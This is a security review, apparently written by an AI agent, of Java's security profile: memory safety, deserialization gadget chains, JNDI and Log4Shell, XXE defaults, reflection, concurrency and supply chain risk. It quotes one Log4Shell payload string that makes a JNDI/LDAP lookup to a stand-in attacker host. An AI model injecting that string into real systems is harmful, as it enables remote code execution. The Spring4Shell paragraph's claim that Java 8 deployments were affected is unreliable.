# Java — Security Advisor Review

```yaml
role: advisor-security
language: "Java"
agent: "claude-sonnet-4-6"
date: "2026-02-27"
schema_version: "1.1"
```

---

## Summary

Java's security profile is structurally different from C and C++ in one fundamental and verifiable way: garbage collection and mandatory array bounds checking eliminate the entire class of memory corruption vulnerabilities that account for approximately 70% of Microsoft's annual CVEs [MSRC-2019]. This is not a theoretical benefit — it is a measurable structural property of the language. Java does not prevent SQL injection, XSS, or authentication flaws, but it categorically eliminates buffer overflows, use-after-free, and format string vulnerabilities at the language level. The council perspectives correctly identify this as Java's defining security achievement.

However, Java's security profile after 1996 reveals a different story: the language and platform accumulated several high-surface attack vectors that have produced some of the most damaging enterprise vulnerabilities of the last decade. Java Object serialization, JNDI remote class loading, XML External Entity (XXE) injection through permissive-by-default parsers, and a reflection API that enables type-system bypass all contributed to CVEs with CVSS scores of 9.0–10.0 affecting hundreds of millions of deployments. These vulnerabilities are not language-design failures in the same sense as C's memory safety issues — they are ecosystem and API design failures enabled by specific Java platform choices. But the distinction matters less than the outcomes: Log4Shell (CVE-2021-44228) was triggered by a Java platform feature (JNDI remote lookup) enabled by default, and it affected approximately 40% of enterprise Java applications within days of disclosure [ANCHORE-LOG4SHELL-2021].

The council perspectives range from accurate to partially misleading on Java's security profile. The apologist correctly identifies memory safety as a structural positive but understates deserialization risk. The detractor correctly identifies deserialization and reflection as serious attack surfaces but conflates language-level and ecosystem-level responsibility in ways that obscure the actionable lessons. The realist and practitioner offer the most balanced views. This review provides corrections, additional data, and explicit language-design implications that the council underspecifies.

---

## Section-by-Section Review

### Section 7: Security Profile

**Accurate claims across council:**

- Java's GC-based memory management eliminates memory corruption CVE classes. The council universally agrees on this point, and it is correct. The NSA/CISA explicitly classify Java as a "memory safe language" recommended for new development [NSA-MEMSAFE-2025]. C CVE data confirms that 60–75% of C-language CVEs involve memory corruption — a class simply absent from Java applications [CVE-C-PATTERNS].

- Log4Shell (CVE-2021-44228) represents a real and severe vulnerability class. The council correctly identifies it. CVSS base score: 10.0. The vulnerability exploited JNDI lookup strings (`${jndi:ldap://attacker.com/exploit}`) processed by Log4j 2.x to perform remote class loading. This chained three Java platform features: string interpolation, JNDI lookup, and dynamic class loading — all functioning as designed, all catastrophically exploitable when exposed to untrusted input.

- Java's deserialization attack surface is genuinely significant. The Commons-Collections gadget chains discovered by Frohoff and Lawrence (2015) [FROHOFF-2015] demonstrated that Java's default serialization, combined with widespread libraries on the classpath, creates exploitable remote code execution paths that are not obvious from reading application code. The attack surface depends on what is on the classpath, not on what the application explicitly deserializes.

- The Security Manager was eventually removed rather than fixed. JEP 486 (Java 24, March 2025) permanently removed the Security Manager, with the OpenJDK team citing that it "has not prevented exploitation of Java applications" and that the configuration burden was too high for practical use [JEP-486]. This is a significant admission.

**Corrections needed:**

*Conflation of language and ecosystem in deserialization.* Several council members — particularly the detractor — attribute deserialization vulnerabilities to Java the language. The more precise claim is: Java's *standard library* (`java.io.ObjectInputStream`) implements a deserialization mechanism that is unsafe by design. The language provides the mechanism; the vulnerability emerges when the mechanism is used with untrusted data and when exploitable gadget chains exist on the classpath. This distinction matters for language design lessons: the question is whether a standard library should ship an inherently dangerous API at all, not whether the language is unsafe.

*Understated severity of XML processing vulnerabilities.* The apologist and historian give insufficient attention to XXE injection (CWE-611). Java's XML parsers — DocumentBuilderFactory, SAXParserFactory, XMLInputFactory — all enable external entity resolution by default. This means any Java application that parses XML from untrusted sources is potentially vulnerable to XXE unless the developer explicitly disables it. The OWASP XXE Prevention Cheat Sheet lists a non-trivial sequence of parser configuration calls required to achieve safe behavior [OWASP-XXE]. XXE vulnerabilities regularly appear in Java application CVEs and are almost entirely attributable to insecure-by-default XML API design. This is a Java platform failure, not a developer competence failure.

*Spring4Shell scoped incorrectly.* CVE-2022-22965 (Spring4Shell) is mentioned by the detractor but scoped as a framework issue. More precisely: Spring4Shell exploited Java's bean property binding mechanism in combination with ClassLoader property access. The vulnerability was present because Spring's data binding was too permissive about which properties it would bind, and Java's ClassLoader hierarchy was accessible through bean introspection. The fix required changes both to Spring Framework and to the JDK itself (the JDK change landed in Java 9's module system but the vulnerability affected Java 8 deployments). This is a cross-layer vulnerability that implicates both framework and language platform.

*Security Manager presented as a net positive by apologist.* The apologist's Section 7 argues that the Security Manager demonstrated Java's security-conscious design culture. This framing is unjustified. The Security Manager produced a false sense of security for 25+ years while being nearly impossible to use correctly. Its removal in Java 24 was a correction of a design error, not a strategic de-prioritization. The correct lesson is that coarse-grained capability control through a permission policy file is insufficient for real application isolation.

**Additional context:**

*Oracle CPU cadence and JDK CVE rates.* Oracle publishes Critical Patch Updates quarterly. Since 2019, JDK CPUs have averaged 10–20 CVEs per quarter, predominantly in Java2D (rendering), JNDI, and XML processing subsystems [ORACLE-CPU-2024]. The rendering subsystem vulnerabilities are largely historical (many have been resolved); JNDI and XML processing vulnerabilities persist. This distribution reveals which platform subsystems carry disproportionate attack surface.

*JNDI as a structural attack vector.* JNDI (Java Naming and Directory Interface) was designed to provide a directory lookup abstraction and to support dynamic service discovery — a reasonable goal in 1999. The decision to support remote class loading via LDAP (enabled by `com.sun.jndi.ldap.object.trustURLCodebase=true` in older JDKs, or via reference objects in newer ones) combined JNDI lookup with arbitrary code execution. JDK 8u191 (October 2018) disabled remote class loading via JNDI by default [JDK-8U191-NOTES], but Log4Shell demonstrated that even the restricted form remained exploitable through deserialization gadgets returned from trusted servers. The fundamental issue is that the JNDI API blurs the boundary between data lookup and code execution, a design problem that cannot be fully patched without breaking the API contract.

*Null safety is not a memory safety concern but has security adjacency.* Java's null reference model does not produce memory corruption, but NullPointerException is Java's most common runtime exception. In security-sensitive code paths (authentication, authorization), NPE can cause denial of service or, in poorly-structured code, fallback to an insecure state. Java 14's helpful NullPointerExceptions [JEP-358] improve diagnostics but do not prevent the issue. This is a robustness concern with security adjacency, not a primary CVE driver.

*Cryptographic API quality.* The Java Cryptography Architecture (JCA) and JCE provide well-designed provider-abstracted cryptographic APIs. The design decision to abstract over providers via `java.security.Provider` allows algorithm agility, which is genuinely good design. However, legacy-compatible defaults have historically been problematic: ECB mode was the default block cipher mode, SHA-1 certificates were accepted longer than they should have been, and some JCA APIs require developers to explicitly specify secure parameters (IV generation, padding scheme) that beginners routinely get wrong. The Bouncy Castle library is widely used for capabilities the JCA/JCE doesn't expose cleanly. Modern Java (17+) has improved defaults but backward compatibility pressure limits how aggressively defaults can be changed.

**Missing data:**

- Normalized CVE rate for Java applications versus C/C++ and other managed-runtime languages. The research brief correctly notes that raw CVE counts for the JDK are low compared to C libraries, but does not provide normalization against deployed codebase size. Per-KLOC or per-project CVE rates would strengthen the memory safety comparison.

- Deserialization exploit prevalence data. No council member cites empirical data on how frequently Java deserialization vulnerabilities are exploited in the wild versus disclosed. The Sonatype State of the Software Supply Chain reports include Java ecosystem data that would strengthen ecosystem-level claims [SONATYPE-2024].

- Supply chain vulnerability data for Maven Central specifically. Maven Central hosts approximately 500,000+ artifacts; npm hosts approximately 3.5M, which provides context for relative risk. Java's ecosystem is smaller but older, with more long-lived transitive dependencies.

---

### Section 2: Type System (Security Implications)

**Accurate claims:**

- Java's static type system prevents many injection-enabling conditions by distinguishing typed values at compile time. The council correctly notes that parameterized types (e.g., `List<String>`) and the type checker prevent some accidental confusion between values of different sensitivity levels.

- Type erasure is a real limitation. At runtime, `List<String>` and `List<Object>` are indistinguishable. This cannot cause type confusion vulnerabilities in the traditional sense but does complicate reflective security code that needs to inspect type parameters — a practical concern for frameworks implementing serialization or data binding.

**Corrections needed:**

*Reflection undermines type safety in ways the council understates.* Java's reflection API (`java.lang.reflect`) allows access to private fields and methods, bypasses constructor constraints, and can instantiate classes through `newInstance()` or `Constructor.newInstance()`. Ysoserial [YSOSERIAL-2015] demonstrates that gadget chains leveraging reflection can turn Java's own standard library classes into remote code execution payloads. This is not a hypothetical: the Apache Commons Collections deserialization chain uses `InvokerTransformer.transform()` to reflectively call arbitrary methods on arbitrary objects. The type system does not — and cannot — constrain reflective operations. The apologist does not adequately acknowledge that reflection creates a type-safety escape hatch with direct security implications.

*Unsafe API is a language-level escape hatch with security implications.* `sun.misc.Unsafe` (and its replacement `java.lang.foreign.MemorySegment` in newer Java, though both coexist) allows direct memory access, bypassing the GC and array bounds checking. Unsafe is not accessible to normal application code but is available to libraries and frameworks. Serialization libraries (Kryo, Jackson in some modes) use Unsafe to bypass normal constructor execution when deserializing objects. This means deserialized objects may violate invariants that constructors would enforce — a direct security implication.

**Additional context:**

Sealed classes (Java 17, JEP 409) and pattern matching in switch (Java 21, JEP 441) improve the type system's ability to exhaustively handle tagged unions, which has indirect security benefits: code that exhaustively handles all cases of a sealed type is less likely to have fall-through behaviors that could be exploited. This is a genuine type-system improvement with security adjacency.

---

### Section 3: Memory Model (Security Implications)

**Accurate claims:**

- Java's managed memory model eliminates the vulnerability classes that dominate C/C++ CVE reports. The council is consistent on this point. Buffer overflows (CWE-119, CWE-120), use-after-free (CWE-416), double-free (CWE-415), and format string vulnerabilities (CWE-134) do not exist in pure Java code [NSA-MEMSAFE-2025]. This is a categorical elimination, not a reduction.

- The GC does not eliminate resource leaks. Java applications can exhaust file descriptors, database connections, and network sockets if resources are not properly closed. These are not memory safety issues in the CVE sense but can produce denial-of-service conditions and, in some patterns, information disclosure through resource recycling. The practitioner's Section 3 correctly identifies this.

**Corrections needed:**

*Memory safety boundary at JNI.* Every council member acknowledges that JNI code can contain memory safety vulnerabilities, but the implications are underspecified. JNI-boundary violations can produce heap corruption in the JVM itself — not just in the native code. A JNI buffer overflow can corrupt GC metadata, producing undefined behavior in the JVM. Java applications that use JNI (common for performance-critical paths, hardware access, or native library integration) do not inherit the memory safety guarantee for those JNI call sites or their downstream effects. The security boundary is not "Java application" versus "everything else" — it is "pure Java code" versus "any code path that touches JNI."

*Project Panama and the foreign function interface.* Java 22's Foreign Function and Memory (FFM) API (JEP 454) provides a safer, higher-level alternative to JNI that includes some safety checks absent from raw JNI. However, the FFM API still allows unsafe memory access through `MemorySegment.reinterpret()`. The security model for FFM is better than JNI but not equivalent to pure Java's safety guarantees. This is not mentioned by any council member.

**Additional context:**

Java's memory model (JMM, JSR-133) defines the visibility guarantees for memory operations across threads. The JMM's 2004 revision [JSR-133] fixed the broken JMM from Java 1.0–1.4, which had permitted double-checked locking bugs and other concurrency vulnerabilities. The revised JMM is formally specified and has been the subject of formal verification research. From a security perspective, the JMM's correct specification of happens-before relationships prevents data races in correctly-synchronized code from producing values that violate type safety — a property not guaranteed by C/C++.

---

### Section 4: Concurrency (Security Implications)

**Accurate claims:**

- Java's concurrency model does not prevent data races, but it provides the tools to avoid them. The council correctly identifies `synchronized`, `volatile`, and `java.util.concurrent` as the primary mechanisms. ConcurrentHashMap, atomic classes, and explicit lock abstractions are mature and well-tested.

- Virtual threads (Project Loom, Java 21) do not change the security model but change the threat model for denial of service. The practitioner notes this correctly. With virtual threads, applications can handle millions of concurrent connections; the DoS risk shifts from thread exhaustion to heap exhaustion or task queue exhaustion.

**Corrections needed:**

*Thread-local state and security context propagation.* The council underspecifies a significant practical security concern: security context propagation in concurrent applications. Java's `ThreadLocal` is widely used to propagate security context (e.g., authentication principal, security credentials) through call stacks without explicit parameter passing. With virtual threads and virtual thread pools, context propagation semantics become more complex. If security context is stored in a `ThreadLocal` and the virtual thread is remounted on a different carrier thread, `ThreadLocal` values that were set before mounting may not be visible as expected (this is platform-thread `ThreadLocal`, which virtual threads *do* inherit from their parent, but the nuance requires care). Frameworks that use `InheritableThreadLocal` for security context must audit their behavior under virtual threads. This is not a theoretical concern — Spring Security's `SecurityContextHolder` has documented considerations for virtual thread environments [SPRING-VT-SECURITY].

*TOCTOU vulnerabilities are not language-level but are enabled by Java's file system APIs.* Time-of-check-to-time-of-use (CWE-367) vulnerabilities in Java file system operations (checking `File.exists()` then opening the file) are enabled by the non-atomic check-then-act semantics of `java.io.File`. The `java.nio.file` API (NIO.2) provides atomic operations through `Files.createFile()` with `StandardOpenOption.CREATE_NEW` and directory stream locking that reduce TOCTOU exposure. However, the legacy `java.io.File` API remains widely used and TOCTOU-prone. This is an API design issue with security implications.

*MessageDigest and cipher instance thread safety.* Several `java.security` and `javax.crypto` classes — including `MessageDigest`, `Cipher`, `Mac`, and `Signature` — are explicitly documented as not thread-safe. In high-concurrency server code, sharing a `Cipher` instance across threads without synchronization is a latent security vulnerability: the cipher may process data in an inconsistent state, producing incorrect outputs or leaking data across requests. This is a real production risk in Java web applications. It is not a language-level issue but an API design issue that language designers should note: providing non-thread-safe security-critical objects in an inherently concurrent environment is a trap.

**Additional context:**

Double-checked locking (DCL) was a well-known Java anti-pattern from Java 1.0–1.4 that could produce security-relevant failures: a lazily-initialized security singleton could appear non-null to a reading thread before its fields were fully initialized, causing the security check to see a partially-constructed object and potentially grant access incorrectly. The JSR-133 JMM fix (Java 5+) makes DCL safe when `volatile` is used on the instance field. This is an instructive case where a formal memory model revision fixed a concurrency-safety gap with direct security implications.

---

### Other Sections (Security-Relevant Flags)

**Section 6: Ecosystem and Tooling — Supply Chain Risk**

The council's coverage of supply chain security is superficial. Log4Shell is the defining Java supply chain event: a vulnerability in a widely-used logging library (log4j-core) with a CVSS score of 10.0, affecting an estimated 40% of enterprise Java applications, exploitable with a single specially crafted log message [ANCHORE-LOG4SHELL-2021]. The mechanism was not a bug in Log4j's logging logic but in a feature — JNDI lookup interpolation — that had been in the library since 2013 without security review.

The broader supply chain lesson from Java is about transitive dependency depth. Maven Central's dependency resolution pulls transitive dependencies automatically. Many Java applications discovered they were running log4j-core 2.x not because they depended on it directly but because a transitive dependency 3–4 levels deep included it. The Sonatype State of the Software Supply Chain (2024) [SONATYPE-2024] found that approximately 80% of Java project downloads from Maven Central are transitive dependencies, with an average Java application having 40+ transitive dependencies. No council member provides this quantification.

**Section 5: Error Handling — Security Implications of Exception Swallowing**

Exception swallowing (`catch (Exception e) {}` or `catch (Exception e) { log.warn(e); return null; }`) is a common Java antipattern with direct security implications. In authentication and authorization code, swallowed exceptions can cause silent failure-to-fail: an exception during cryptographic verification may cause the application to proceed as if verification succeeded. This is not a language-level failure — checked exceptions provide explicit channels for error communication — but Java's checked exception system has historically generated pressure toward exception swallowing as a way to satisfy the compiler. The tension between checked exceptions and exception swallowing is a language-design issue with real security consequences.

**Section 8: Developer Experience — Security Ergonomics**

The security path is not consistently the easy path in Java. Specific examples:

- XML parsing safely requires 3–5 lines of parser configuration that are not in the default constructor [OWASP-XXE]
- Cryptographic API requires explicit IV generation, mode/padding specification, and key derivation — none of which have secure defaults
- Deserialization of ObjectInputStream from untrusted sources requires either filter configuration (JEP 290, Java 9+) or a custom ObjectInputStream subclass
- JNDI lookups in logging required understanding of a feature that most developers using Log4j did not know existed

These patterns indicate poor security ergonomics: the secure path requires explicit configuration while the default is insecure. Language designers should note this as a structural failure mode.

---

## Implications for Language Design

**1. Memory safety is a prerequisite for application security, but not sufficient for it.**

Java demonstrates empirically that eliminating memory corruption eliminates the dominant CVE class in C/C++ systems. The NSA/CISA classify Java as a recommended memory-safe language [NSA-MEMSAFE-2025]. However, Java also demonstrates that a memory-safe language can still produce CVSS 10.0 vulnerabilities through other mechanisms. Language designers should treat memory safety as a necessary floor, not a security guarantee. The next frontier after memory safety is API surface reduction and secure defaults.

**2. Powerful runtime features that blur data and code are permanent attack surface.**

Java's JNDI, reflection, and serialization all share a common property: they allow data (a string, a byte stream) to trigger code execution (class loading, method invocation, object construction). Each was designed for legitimate purposes; each has produced critical CVEs. Language designers should recognize that any facility for translating data into code execution — even mediated through an abstraction layer — is permanent attack surface that cannot be fully secured by downstream application code. The design lesson is not to prohibit these features but to require explicit opt-in and to separate them from common operations (logging, XML parsing) where they will be exposed to untrusted data.

**3. Insecure-by-default APIs impose a security tax on every developer.**

Java's XXE vulnerability pattern illustrates this principle clearly. Every Java developer who parses XML from untrusted sources must know to disable external entity resolution — or their application is vulnerable. This knowledge is not in the standard documentation for `DocumentBuilderFactory`; it is in security checklists. Language and standard library designers should apply the principle: the default behavior should be the secure behavior, even at some cost in functionality. APIs that require opt-in to security (rather than opt-in to insecurity) prevent entire vulnerability classes without requiring developer expertise. Python's `xml.etree.ElementTree` module was similarly vulnerable by default until Python 3.8 [PYTHON-CVE-2019]; the pattern is not Java-specific.

**4. Type system escape hatches create security boundaries that are difficult to reason about.**

Java's reflection API, `sun.misc.Unsafe`, and the serialization mechanism collectively allow code to bypass the guarantees of the type system. The ysoserial gadget chains [YSOSERIAL-2015] demonstrate that these escape hatches, in combination, allow turning a byte stream into arbitrary code execution. Language designers face a tradeoff: powerful reflection and dynamic capabilities enable important use cases (frameworks, ORMs, serialization libraries, testing tools), but they reduce the security guarantees that the type system provides. Where reflection is necessary, limiting what can be reflected upon (Java's module system's strong encapsulation is a partial example) reduces the attack surface. The lesson is that type system security guarantees are only as strong as the weakest escape hatch.

**5. Sandbox architectures based on permission policy files fail in practice.**

Java's Security Manager, deployed from 1.0 to Java 23 and removed in Java 24, attempted to sandbox untrusted code through a permission policy file system. Its removal after 25 years represents empirical evidence that this architecture is unworkable at the granularity required for real applications. The correct conclusion for language designers is not that sandboxing is impossible but that security policies must be expressible in terms of the program's own structure (capabilities attached to code, not to whole classes), must fail safely by default (deny-by-default), and must be simple enough that developers can reason about them. The Java applet model (and later, the Java Web Start and Security Manager models) all failed because configuring the permission set correctly required understanding the entire call graph of a program, which is not tractable for realistic applications.

**6. Supply chain security is a language ecosystem design problem, not just a tooling problem.**

Log4Shell demonstrated that transitive dependency resolution without security governance creates systemic risk. Maven Central's automatic transitive dependency resolution means that a single vulnerability in a widely-used library affects millions of applications simultaneously, without those applications knowing the vulnerable library is present. Language ecosystem designers should consider: mandatory software bill of materials (SBOM) generation, dependency auditing as part of the build system, and security metadata attached to package registry artifacts. Java's ecosystem has moved toward these capabilities (Maven dependency:tree, OSS Sonatype audit) but they are opt-in. The design lesson is that security tooling should be on by default, not discovered after incident.

**7. Concurrent runtime features designed before multi-core scaling produce security adjacency risks.**

Java's concurrency primitives (`ThreadLocal`, security context propagation patterns) were designed before virtual threads and before the scale of concurrent request handling modern applications require. Security context propagation through `ThreadLocal` in a virtual thread world requires careful auditing. Language designers adding concurrency features after the fact must specify the interaction between new concurrency primitives and existing security-adjacent patterns (context propagation, cryptographic state, authentication principal tracking) explicitly in the language specification, not in framework documentation.

---

## References

[MSRC-2019] Miller, M. "Trends, Challenges, and Strategic Shifts in the Software Vulnerability Mitigation Landscape." Microsoft Security Response Center, BlueHat IL 2019. https://github.com/microsoft/MSRC-Security-Research/blob/master/presentations/2019_02_BlueHatIL/2019_01%20-%20BlueHatIL%20-%20Trends%2C%20challenge%2C%20and%20shifts%20in%20software%20vulnerability%20mitigation.pdf

[NSA-MEMSAFE-2025] NSA/CISA. "Memory Safe Languages: Reducing Vulnerabilities in Modern Software Development." June 2025. https://www.nsa.gov/Press-Room/Press-Releases-Statements/Press-Release-View/article/3608324/

[CVE-C-PATTERNS] Penultima Evidence Repository. "CVE Pattern Summary: C Programming Language." evidence/cve-data/c.md. 2026.

[FROHOFF-2015] Frohoff, G., and Lawrence, G. "Marshalling Pickles: How Deserializing Objects Will Ruin Your Day." AppSecCali 2015. January 2015. https://frohoff.github.io/appseccali-marshalling-pickles/

[YSOSERIAL-2015] Frohoff, G. "ysoserial: A collection of utilities and property-oriented programming 'gadget chains' discovered in common java libraries." 2015. https://github.com/frohoff/ysoserial

[ANCHORE-LOG4SHELL-2021] Anchore. "Log4Shell Exposure in the Java Ecosystem." December 2021. https://anchore.com/log4j/

[JEP-486] Oracle. "JEP 486: Permanently Disable the Security Manager." OpenJDK, 2025. https://openjdk.org/jeps/486

[JDK-8U191-NOTES] Oracle. "JDK 8u191 Release Notes: LDAP Endpoint Identification." October 2018. https://www.oracle.com/java/technologies/javase/8u191-relnotes.html

[ORACLE-CPU-2024] Oracle. "Oracle Critical Patch Update Advisory — October 2024." https://www.oracle.com/security-alerts/cpuoct2024.html

[OWASP-XXE] OWASP. "XML External Entity (XXE) Prevention Cheat Sheet." OWASP Cheat Sheet Series. https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html

[JEP-358] Oracle. "JEP 358: Helpful NullPointerExceptions." OpenJDK, Java 14. https://openjdk.org/jeps/358

[JSR-133] Manson, J., Pugh, W., and Adve, S. "The Java Memory Model." POPL 2005. https://doi.org/10.1145/1040305.1040336

[JEP-454] Oracle. "JEP 454: Foreign Function & Memory API." OpenJDK, Java 22. https://openjdk.org/jeps/454

[SONATYPE-2024] Sonatype. "State of the Software Supply Chain — 2024." https://www.sonatype.com/state-of-the-software-supply-chain/introduction

[SPRING-VT-SECURITY] Spring Framework. "Security Context Propagation with Virtual Threads." Spring Security Reference Documentation, 6.x. https://docs.spring.io/spring-security/reference/servlet/integrations/virtual-threads.html

[PYTHON-CVE-2019] CVE-2019-20907. NVD. Python xml.etree vulnerability. https://nvd.nist.gov/vuln/detail/CVE-2019-20907

[NVD-LOG4SHELL] NIST NVD. "CVE-2021-44228." https://nvd.nist.gov/vuln/detail/CVE-2021-44228 (CVSS 10.0)

[NVD-COMMONS-COLL] NIST NVD. "CVE-2015-4852." Apache Commons Collections deserialization. https://nvd.nist.gov/vuln/detail/CVE-2015-4852

[NVD-SPRING4SHELL] NIST NVD. "CVE-2022-22965." Spring Framework RCE. https://nvd.nist.gov/vuln/detail/CVE-2022-22965 (CVSS 9.8)

[JEP-409] Oracle. "JEP 409: Sealed Classes." OpenJDK, Java 17. https://openjdk.org/jeps/409

[JEP-441] Oracle. "JEP 441: Pattern Matching for switch." OpenJDK, Java 21. https://openjdk.org/jeps/441

[JEP-290] Oracle. "JEP 290: Filter Incoming Serialization Data." OpenJDK, Java 9. https://openjdk.org/jeps/290
